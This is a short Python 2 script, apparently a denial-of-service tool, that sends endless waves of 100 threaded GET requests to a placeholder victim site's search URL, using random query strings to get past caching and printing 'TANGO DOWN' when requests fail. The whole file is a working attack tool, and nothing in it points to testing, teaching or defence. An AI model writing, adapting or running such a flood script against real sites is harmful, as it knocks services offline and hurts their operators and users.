from random import choice
import threading
import time
import requests
import string

class ActivePool(object):
  def __init__(self):
    super(ActivePool, self).__init__()
    self.active = []
    self.lock = threading.Lock()
  def makeActive(self, name):
    with self.lock:
      self.active.append(name)
      print "%s Started" % (self.active)
  def makeInactive(self, name):
    with self.lock:
      self.active.remove(name)
      print "%s Removed" % (self.active)

def GenString(length=8, chars=string.letters + string.digits):
  return ''.join([choice(chars) for i in range(length)])

def Atk(s, pool, url):
  with s:
    stringb = GenString(8,string.digits) + GenString(15,string.ascii_letters)
    for x in range(2):
      try:
        r = requests.get(url + stringb)
        name = threading.currentThread().getName()
        pool.makeActive(name)
        time.sleep(0.1)
        pool.makeInactive(name)
        print r.status_code

      except requests.exceptions.RequestException as e:
        print "TANGO DOWN"

pool = ActivePool()
limit = 100
url = 'https://www.<<<VICTIM>>>.com/?s='
s = threading.Semaphore(limit)

while True:
  print "atk start"

  for i in range(limit):
    t = threading.Thread(target=Atk, args=(s, pool, url)) 
    t.start()

  print "atk done, reseting.."
  
  time.sleep(60)
